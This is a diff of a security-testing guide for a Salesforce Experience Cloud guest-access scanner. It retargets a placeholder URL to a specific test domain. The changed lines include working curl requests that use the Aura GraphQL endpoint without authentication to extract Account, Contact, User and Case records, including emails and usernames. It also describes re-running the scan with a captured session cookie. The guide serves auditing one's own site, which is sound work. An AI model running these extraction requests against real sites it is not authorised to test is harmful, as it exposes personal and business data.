@@ -36,10 +36,10 @@ pip install -r requirements.txt
 ### Step 2: Run a Complete Guest Analysis
 To test what a **Unauthenticated Guest User** has access to, you run the tool without providing any cookies or session tokens.
 
-Run the tool targeting your live site and save the results cleanly into an output directory. 
+Run the tool targeting your live site and save the results cleanly into an output directory. Because your live site uses a custom domain and path (`https://test.mydomain.com/testsite`), you point the `-u` flag to the root of the site, but also use the `--app` flag to force it to look in your custom application directory instead of the generic `/s` default.
 
 ```powershell
-python src\aura_cli.py -u https://your-live-site.my.site.com -o results_guest
+python src\aura_cli.py -u https://test.mydomain.com/testsite --app /testsite/s -o results_guest
 ```
 
 **What the tool does automatically during this sweep:**
@@ -70,7 +70,7 @@ Open your terminal and run the following matching the target URL and the **Objec
 
 ##### Extracting `Account` (First 10 Records)
 ```powershell
-curl -X POST "https://your-live-site.my.site.com/s/sfsites/aura" `
+curl -X POST "https://test.mydomain.com/testsite/s/sfsites/aura" `
   -H "Content-Type: application/x-www-form-urlencoded" `
   -d 'message={"actions":[{"id":"GraphQL","descriptor":"aura://RecordUiController/ACTION$executeGraphQL","callingDescriptor":"markup://forceCommunity:richText","params":{"queryInput":{"operationName":"accounts","query":"query+accounts+{uiapi+{query+{Account(first:10){edges+{node+{+Name+{+value+}}}}}}}}","variables":{}}},"version":"64.0","storable":true}]}' `
   -d "aura.context={'mode':'PROD','app':'siteforce:communityApp'}&aura.token=null"
@@ -80,7 +80,7 @@ curl -X POST "https://your-live-site.my.site.com/s/sfsites/aura" `
 *If you need to retrieve all records in large batches (up to 2,000 at a time), you change `(first:10)` to `(first:2000)` and add `pageInfo{endCursor,hasNextPage}` so you can paginate if there are more than 2,000 records.*
 
 ```powershell
-curl -X POST "https://your-live-site.my.site.com/s/sfsites/aura" `
+curl -X POST "https://test.mydomain.com/testsite/s/sfsites/aura" `
   -H "Content-Type: application/x-www-form-urlencoded" `
   -d 'message={"actions":[{"id":"GraphQL","descriptor":"aura://RecordUiController/ACTION$executeGraphQL","callingDescriptor":"markup://forceCommunity:richText","params":{"queryInput":{"operationName":"accounts","query":"query+accounts+{uiapi+{query+{Account(first:2000){edges+{node+{+Name+{+value+}}}pageInfo{endCursor,hasNextPage}}}}}","variables":{}}},"version":"64.0","storable":true}]}' `
   -d "aura.context={'mode':'PROD','app':'siteforce:communityApp'}&aura.token=null"
@@ -89,7 +89,7 @@ curl -X POST "https://your-live-site.my.site.com/s/sfsites/aura" `
 
 ##### Extracting `Contact`
 ```powershell
-curl -X POST "https://your-live-site.my.site.com/s/sfsites/aura" `
+curl -X POST "https://test.mydomain.com/testsite/s/sfsites/aura" `
   -H "Content-Type: application/x-www-form-urlencoded" `
   -d 'message={"actions":[{"id":"GraphQL","descriptor":"aura://RecordUiController/ACTION$executeGraphQL","callingDescriptor":"markup://forceCommunity:richText","params":{"queryInput":{"operationName":"contacts","query":"query+contacts+{uiapi+{query+{Contact(first:10){edges+{node+{+Name+{+value+},+Email+{+value+},+Phone+{+value+}}}}}}}}","variables":{}}},"version":"64.0","storable":true}]}' `
   -d "aura.context={'mode':'PROD','app':'siteforce:communityApp'}&aura.token=null"
@@ -97,7 +97,7 @@ curl -X POST "https://your-live-site.my.site.com/s/sfsites/aura" `
 
 ##### Extracting `User`
 ```powershell
-curl -X POST "https://your-live-site.my.site.com/s/sfsites/aura" `
+curl -X POST "https://test.mydomain.com/testsite/s/sfsites/aura" `
   -H "Content-Type: application/x-www-form-urlencoded" `
   -d 'message={"actions":[{"id":"GraphQL","descriptor":"aura://RecordUiController/ACTION$executeGraphQL","callingDescriptor":"markup://forceCommunity:richText","params":{"queryInput":{"operationName":"users","query":"query+users+{uiapi+{query+{User(first:10){edges+{node+{+Name+{+value+},+Username+{+value+},+Email+{+value+}}}}}}}}","variables":{}}},"version":"64.0","storable":true}]}' `
   -d "aura.context={'mode':'PROD','app':'siteforce:communityApp'}&aura.token=null"
@@ -105,7 +105,7 @@ curl -X POST "https://your-live-site.my.site.com/s/sfsites/aura" `
 
 ##### Extracting `Case`
 ```powershell
-curl -X POST "https://your-live-site.my.site.com/s/sfsites/aura" `
+curl -X POST "https://test.mydomain.com/testsite/s/sfsites/aura" `
   -H "Content-Type: application/x-www-form-urlencoded" `
   -d 'message={"actions":[{"id":"GraphQL","descriptor":"aura://RecordUiController/ACTION$executeGraphQL","callingDescriptor":"markup://forceCommunity:richText","params":{"queryInput":{"operationName":"cases","query":"query+cases+{uiapi+{query+{Case(first:10){edges+{node+{+CaseNumber+{+value+},+Subject+{+value+},+Status+{+value+}}}}}}}}","variables":{}}},"version":"64.0","storable":true}]}' `
   -d "aura.context={'mode':'PROD','app':'siteforce:communityApp'}&aura.token=null"
@@ -113,7 +113,7 @@ curl -X POST "https://your-live-site.my.site.com/s/sfsites/aura" `
 
 ##### Extracting `User_Access_Request__c` (Custom Object)
 ```powershell
-curl -X POST "https://your-live-site.my.site.com/s/sfsites/aura" `
+curl -X POST "https://test.mydomain.com/testsite/s/sfsites/aura" `
   -H "Content-Type: application/x-www-form-urlencoded" `
   -d 'message={"actions":[{"id":"GraphQL","descriptor":"aura://RecordUiController/ACTION$executeGraphQL","callingDescriptor":"markup://forceCommunity:richText","params":{"queryInput":{"operationName":"custom_object","query":"query+custom_object+{uiapi+{query+{User_Access_Request__c(first:10){edges+{node+{+Name+{+value+},+Id+{+value+}}}}}}}}","variables":{}}},"version":"64.0","storable":true}]}' `
   -d "aura.context={'mode':'PROD','app':'siteforce:communityApp'}&aura.token=null"
@@ -150,5 +150,5 @@ python src\aura_cli.py -u https://partners.your-custom-domain.com/myCustomApp/s 
 If you acquire standard user login credentials for the community portal, you should absolutely re-run this tool from an authenticated viewpoint to test for internal privilege escalation. Obtain your `SID` cookie using your browser's dev tools or Burp Suite.
 
 ```powershell
-python src\aura_cli.py -u https://your-live-site.my.site.com -c "sid=00Dxx...; " -o results_authenticated
+python src\aura_cli.py -u https://test.mydomain.com/testsite -c "sid=00Dxx...; " --app /testsite/s -o results_authenticated
 ```
